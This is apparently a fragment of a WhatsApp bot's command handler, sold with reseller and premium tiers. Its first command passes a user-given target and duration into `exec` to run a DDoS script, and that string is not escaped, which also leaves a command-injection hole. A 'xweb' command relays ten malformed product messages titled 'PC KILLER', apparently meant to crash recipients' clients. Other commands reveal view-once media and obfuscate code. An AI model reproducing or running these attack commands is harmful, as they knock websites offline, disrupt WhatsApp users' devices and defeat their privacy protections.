if (!q.includes(' ')) return replygcxeon(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.xyz 60`)
if (q.includes('dgxeon.shop')){
	return replygcxeon(`Cannot attack developer's site`);
	}
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
replygcxeon(`Bot is attacking ${targetweb} with time ${timeweb}`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          replygcxeon(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          replygcxeon(`Error: ${stderr}`);
          return;
        }
        replygcxeon(`Success\n\n🤙 target: ${targetweb},\n🤙 Time: ${timeweb}`);
      });  
      }                 
break

case 'enjjc': case 'encjjrypt': {
	//
        const JSConfuser = require("js-confuser");
        const usage = `Usage Example:
${prefix + command} (Input text or reply text to obfuscate code)
${prefix + command} doc (Reply to a document)`;

        let text;
        if (args.length >= 1) {
            text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
            text = m.quoted.text;
        } else {
            return replygcxeon(usage);
        }
        
        try {
            let code;
            if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
                let docBuffer;
                if (m.quoted.mimetype) {
                    docBuffer = await m.quoted.download();
                }
                code = docBuffer.toString('utf-8');
            } else {
                code = text;
            }

const optionsObf6 = {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "素晴座素晴難XEON素晴座素晴難" + 
            "素晴座素晴難XEON素晴座素晴難";
        
        // Fungsi untuk menghapus karakter yang tidak diinginkan
        function removeUnwantedChars(input) {
            return input.replace(
                /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
            );
        }

        // Fungsi untuk menghasilkan string acak
        function randomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
            const charactersLength = characters.length;

            for (let i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        return removeUnwantedChars(originalString) + randomString(2);
    },

    renameVariables: true,
    renameGlobals: true,

    stringEncoding: true,
    stringSplitting: 0.0,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,

    shuffle: {
        hash: 0.0,
        true: 0.0
    },

    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 0.9,
    deadCode: 0.0,
    dispatcher: true,
    rgf: false,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};


        const options = {
            target: "node",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.5,
  deadCode: 0.25,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  preserveFunctionLength: true,
  identifierGenerator: function () {
                return "DREAM_GUY_XEON" + Math.random().toString(36).substring(7);
            },
        };

            const obfuscatedCode = await JSConfuser.obfuscate(code, optionsObf6);

            const filePath = './enc_by_@DGXeon.js';
            fs.writeFileSync(filePath, obfuscatedCode);

            await DevNexusX.sendMessage(m.chat, {
                document: {
                    url: filePath
                },
                mimetype: 'application/javascript',
                fileName: 'Encrypted By @DGXeon.js'
            }, { quoted: m });

        } catch (error) {
            const errorMessage = `There is an error: ${error.message}`;
            await replygcxeon(errorMessage);
        }
}
break;
case 'dejhc': case 'decryhgpt': {
	//
const { webcrack } = await import('webcrack');
const usage = `Usage Example:
${prefix + command} (Input text or reply text to dec code)
${prefix + command} doc (Reply to a document)`;

let text;
if (args.length >= 1) {
text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
text = m.quoted.text;
} else {
return replygcxeon(usage);
}

try {
let message;
if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;
if (m.quoted.mimetype) {
docBuffer = await m.quoted.download();
}
message = await webcrack(docBuffer.toString('utf-8'));
} else {
message = await webcrack(text);
}

const filePath = './dec_by_@DGXeon.js';
fs.writeFileSync(filePath, message.code);

await DevNexusX.sendMessage(m.chat, {
document: {
url: filePath
},
mimetype: 'application/javascript',
fileName: 'Decrypted By @DGXeon'
}, {quoted: m});

} catch (error) {
const errorMessage = `There is an error: ${error.message}`;
await replygcxeon(errorMessage);
}
}
break;
case 'readviewonce': case 'rvo': {
	//
	if (!m.quoted) return replygcxeon(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygcxeon(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return DevNexusX.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return DevNexusX.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break

case 'clearchat':{
	//
m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
                    }
break;

case 'x':

const imageBuffeudurur = fs.readFileSync('./XeonMedia/thumb.jpg'); 

const messageContentjdudud = {
  extendedTextMessage: {
    text: "olaaa",
    previewType: "NONE",
    contextInfo: {
      externalAdReply: {
        title: "Iniciar atendimento",
        body: "Clique aqui para começar",
        mediaType: 0, // precisa ser 0 ou 1 (number)
        thumbnail: imageBuffeudurur,
        sourceUrl: "", // obrigatório para validar o adReply
        containsAutoReply: false,
        renderLargerThumbnail: false,
        showAdAttribution: false,

        // ESSENCIAIS PARA O GREETING
        automatedGreetingMessageShown: true,
        automatedGreetingMessageCtaType: "START_CHAT",
        greetingMessageBody: "teste by kalzinxs",
        ctaPayload: "iniciar_chat"
      }
    }
  }
}

const msgjsjs = generateWAMessageFromContent(
  from, 
  proto.Message.fromObject(messageContentjdudud), 
  { userJid: from }
)

await DevNexusX.relayMessage(from, msgjsjs.message, { messageId: msgjsjs.key.id })
break;

case 'addrijesell': case 'addjjreseller': {
    if (!global.dev.includes(senderNumber)) return
    
    let number = text.replace(/[^0-9]/g, '') // Extract number from text
    if (!number) return replygcxeon("Please provide a valid number.");

    if (global.db.data.owners.includes(number)) {
        return replygcxeon("Number already in reseller list.");
    }

    global.db.data.owners.push(number);
    fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2));
    replygcxeon(`Number ${number} added to reseller.`);
}
break;

case 'delresell': case 'delreseller': {
    if (!global.dev.includes(senderNumber)) return

    let numberToDelete = text.replace(/[^0-9]/g, '') // Extract the number
    if (!numberToDelete) return m.reply("Please provide a valid number to delete.");

    // Check if the number exists in the owners list
    let index = global.db.data.owners.indexOf(numberToDelete);
    if (index === -1) {
        return replygcxeon("The provided number is not in the reseller list.");
    }

    // Remove the number from the owners list
    global.db.data.owners.splice(index, 1);
    fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2));
    replygcxeon(`Number ${numberToDelete} has been removed from the reseller list.`);
}
break;

case 'listresell': case 'listreseller': {
    let owners = global.db.data.owners || [];
    if (owners.length === 0) {
        return replygcxeon("There are no reseller in the list.");
    }

    let ownerList = owners.map((num, index) => `${index + 1}. ${num}`).join('\n');
    replygcxeon(`Total Reseller: ${owners.length}\n\n${ownerList}`);
}
break;


case 'addpjkrem':
			case 'addprkkemium': {
				if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @DGXeon
Telegram: @F_1KE
WhatsApp: +916909137213`);
}
				if (!text) return replygcxeon(`*Incorrect use!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				let nomor = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
				if (owner.includes(nomor)) return replygcxeon("*Bot owners can't get owner!*")
				let premium = await cd.isPremium(usersdb, nomor)
				if (premium) return replygcxeon("*This user is already in the premium list*")
				let users = await DevNexusX.onWhatsApp(nomor)
				if (users.length < 1) return replygcxeon(`*Tag/reply/input number correctly!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				let expired = text.split("|")[1]
				if (!expired) return replygcxeon(`*Enter expiry date!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				await DevNexusX.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				let addprem = await cd.addPrem(usersdb, users[0].jid, expired)
				const contentText = {
					text: addprem,
					contextInfo: {
						mentionedJid: DevNexusX.ments(addprem),
						externalAdReply: {
							title: `OWNER 💳`,
							previewType: "PHOTO",
							thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
							sourceUrl: link
						}
					}
				};
				return DevNexusX.sendMessage(m.chat, contentText, {
					quoted: m,
				});
			}
			break

case 'delpmmrem':
			case 'delprmjemium': {
				if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @DGXeon
Telegram: @F_1KE
WhatsApp: +916909137213`);
}
				if (!text) return replygcxeon(`*Incorrect use!*\n\nUsage:\n${prefix + command} <user>\n\nExample:\n${prefix + command} @0`)
				let nomor = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
				let premium = await cd.isPremium(usersdb, nomor)
				if (!premium) return replygcxeon("*This user is not a premium user!*")
				let delprem = await cd.delPrem(usersdb, nomor)
				replygcxeon(delprem)
			}
			break

case 'listprmkem':
case 'listpjjremium': {
	if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @DGXeon
Telegram: @F_1KE
WhatsApp: +916909137213`);
}
    try {
        let premium = await cd.listPremium(usersdb);
        let teks = `*</> PREM USER LIST </>*\n\n`;

        for (let i = 0; i < premium.length; i++) {
            let expiry = usersdb[premium[i]].premiumExpiry;

            if (!expiry || expiry <= Date.now()) {
                teks += `${i + 1}. @${premium[i].split("@")[0]}\nExpired: Already expired\n\n`;
                continue;
            }

            // Calculate remaining time
            let timeLeft = expiry - Date.now();
            let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
            let hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            let minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));

            teks += `${i + 1}. @${premium[i].split("@")[0]}\nExpire In: ${days} day, ${hours} hour, ${minutes} minute\n\n`;
        }

        DevNexusX.sendTextWithMentions(m.chat, teks, m);
    } catch (error) {
        replygcxeon(util.format(error), command);
    }
}
break;

			
			case 'checkmmjprem':
case 'checkpjkremium': {
    try {
        let expiry = usersdb[m.sender].premiumExpiry;
        if (!expiry || expiry <= Date.now()) {
            return replygcxeon(`Your owner subscription has already expired.`);
        }

        // Calculate remaining time
        let timeLeft = expiry - Date.now();
        let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
        let hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        let minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));

        let teks = `*</> PREM USER INFO </>*

*Subscribe Info* :
- User : @${m.sender.split("@")[0]}
- Duration : ${days}D
- Expire In : 
${days} day, ${hours} hour, ${minutes} minute

*Benefit Info* :
- Premium Access : Yes
- User Priority : Yes
`;

        const contentText = {
            text: teks,
            contextInfo: {
                mentionedJid: DevNexusX.ments(teks),
                externalAdReply: {
                    title: `PREMIUM 💳`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
                    sourceUrl: link,
                },
            },
        };

        return DevNexusX.sendMessage(m.chat, contentText, { quoted: m });
    } catch (error) {
        await replygcxeon(util.format(error), command);
    }
}
break;


case 'sjjelf': {
        	if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @DGXeon
Telegram: @F_1KE
WhatsApp: +916909137213`);
}
DevNexusX.public = false
replygcxeon('Success Change To Self Mode')
}
break

case 'pubjjlic': {
        	if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @DGXeon
Telegram: @F_1KE
WhatsApp: +916909137213`);
}
DevNexusX.public = true
replygcxeon('Success Change To Public Mode')
}
break
case "listgc":{
	//
let getGroups = await DevNexusX.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST OF GROUP BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await DevNexusX.groupMetadata(x)
teks += `❏ Group ${hituet+=1}\n│⭔ *Name :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
m.reply(teks)
  }
break
case 'owner': {
const wokex = ownernomer // Extract the number part
const pushnamex = `${wokex}`
const kontak = {
"displayName": pushnamex,
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${pushnamex}\nitem1.TEL;waid=${wokex}:${wokex}\nitem1.X>ABLabel:\nPlease Don't Spam My Owner\nURL;Email Owner:${pushnamex}@gmail.com\nORG: THIS IS MY OWNER\nEND:VCARD`
}
const oke = await DevNexusX.sendMessage(from, {
contacts: { contacts: [kontak] },
contextInfo:{ forwardingScore: 999, isForwarded: false, mentionedJid:[sender],
"externalAdReply":{
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"jpegThumbnail": fs.readFileSync("./XeonMedia/thumb.jpg"),
"mediaUrl": 'https://files.catbox.moe/l95ssx.jpg',
"sourceUrl": `https://youtube.com/@dgxeon`
}}}, { quoted: m })
await DevNexusX.sendMessage(m.chat, {audio: fs.readFileSync('./XeonMedia/sikma.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:oke})
}
break
case 'xweb':
try {
for (let i = 0; i < 10; i++) {
messa = await prepareWAMessageMedia({
image: {
url: `https://pic.re/image`
}
}, {
upload: DevNexusX.waUploadToServer
})
catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"itemCount": 99999999999,
"title": `PC KILLER X Telegram: @F_1KE`,
"description": ``,
"currencyCodeIso4217": "IDR",
"footerText": ``,
"productImageCount": 99999999999999999999,
"firstImageId": 9999999999,
"priceAmount1000": "999",
"salePriceAmount1000": "IDR 99.99999999999999999999",
"thumbnail": messa.imageMessage,
"jpegThumbnail": m,
"firstImageId": 99999999,
"url": "wa.me/5512981791389"
},
"businessOwnerJid": from,
}
}), {
userJid: DevNexusX.user.id,
quoted: null
})
DevNexusX.relayMessage(from, catalog.message, {
messageId: catalog.key.id
})
}
} catch (e) {
console.log(e);
}
break
	case 'pijng': case 'runtinme': case 'pn1': case 'botjstatus': case 'statusjbot': {
		//
                const speed = require('performance-now')
const { performance } = require('perf_hooks')
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed:\n${latensi.toFixed(4)} _Second_ \n${oldd - neww} _miliseconds_\n\nRuntime:\n${runtime(process.uptime())}
                `.trim()
                replygcxeon(respon)
            }
            break
case 'makecase':
//
if (!m.quoted) return replygcxeon('Reply to a message to make a case of it!');
кибар = q.split(' ')[0];
if (!кибар) {
        return replygcxeon(`Example Usage: ${prefix+command} abc`);
    }    
const kak = (JSON.stringify(m.message.extendedTextMessage.contextInfo.quotedMessage, null, 2))
replygcxeon (`case '${кибар}': 
if (!isBot && !isCreator) return
try {
var ${кибар} = generateWAMessageFromContent(from, proto.Message.fromObject(${kak}),{ userJid: from })
DevNexusX.relayMessage(from, ${кибар}.message, {messageId: ${кибар}.key.id })
} catch (e) {
console.log(e)
}
break`)
break

case 'tesb': {
  let msgs = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `hui`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: true,
            ...await prepareWAMessageMedia(
              { image: fs.readFileSync('./XeonMedia/donate.jpg') },
              { upload: DevNexusX.waUploadToServer }
            )
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "Call Owner",
                  phone_number: "+1234567890" // Replace with the actual phone number
                })
              }
            ]
          }),
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: idch,
              newsletterName: ownername,
              serverMessageId: 143
            }
          }
        })
      }
    }
  }, { quoted: m });

  return await DevNexusX.relayMessage(m.chat, msgs.message, {});
}
break;

	
	case "tejjsmen": case "backnnhtomenu": {
  const imageUrl = "https://files.catbox.moe/l95ssx.jpg"; // Define the single image URL

  caption = `tes`

  // Main buttons
  const buttons = [
    {
      buttonId: ".menu",
      buttonText: { 
      displayText: "Xeon" 
      }
    },
    {
      buttonId: "xownermenu",
      buttonText: { 
      displayText: "𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮" 
      }
    },
    {
      buttonId: "tapmenu",
      buttonText: { 
      displayText: "𝐂𝐨𝐧𝐭𝐢𝐧𝐮𝐞" 
      }
    }
  ];

  // Single select button (flow action)
  const flowActions = [
    {
      buttonId: "singleSelect",
      buttonText: { displayText: "𝐒𝐢𝐧𝐠𝐥𝐞 𝐒𝐞𝐥𝐞𝐜𝐭" },
      type: 4, // Indicates a flow action
      nativeFlowInfo: {
        name: "single_select",
        paramsJson: JSON.stringify({
          title: "Select an Option",
          sections: [
            {
              title: "Main Options",
              rows: [
                {
                  title: "Credits And Special Thanks",
                  description: " ",
                  id: "credits"
                },
                {
                  title: "Option 2",
                  description: "Description for Option 2",
                  id: "ping"
                }
              ]
            }
          ]
        })
      }
    }
  ];

  // Add flow actions to the buttons array
  buttons.push(...flowActions);

  DevNexusX.sendMessage(m.chat, {
    image: { url: imageUrl }, // Single image URL used for the message
    caption,
    mentions: [m.sender],
    footer: global.botname,
    buttons,
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363386423395618@newsletter", // Use the newsletterJid here
        newsletterName: `ok`
      }
    }
  }, {quoted:m});
}
break;

case 'getmtype': {
	//
    if (!m.quoted) return replygcxeon('Reply to a message to debug its mtype!');
    const quotedMtype = m.quoted.mtype || 'Unknown';
    console.log(`Quoted Message Type: ${quotedMtype}`);
    await replygcxeon(`Quoted Message Type: ${quotedMtype}`);
    }
break;

default:
}
} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})